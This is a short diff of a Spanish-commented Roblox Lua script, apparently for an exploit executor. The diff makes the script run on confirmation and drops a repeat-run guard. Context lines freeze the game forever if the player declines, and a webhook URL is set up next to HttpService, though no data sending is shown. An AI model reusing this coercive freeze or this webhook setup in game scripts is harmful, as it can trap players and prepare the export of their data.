@@ -142,16 +142,13 @@ repeat task.wait(0.1) until confirmed ~= nil
 
 -- Congelar si dice no
 if not confirmed then while true do task.wait() end end
-
+-- Si confirma, ejecutar script
+MainExecution()
 -- ======= SCRIPT ORIGINAL =======
 -- Pega tu script completo aquí exactamente como lo tenías
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-
--- Evitar ejecución múltiple
-if getgenv().ScriptEjecutado then return end
-getgenv().ScriptEjecutado = true
 
 -- Configuración
 local webhook = _G.webhook or ""
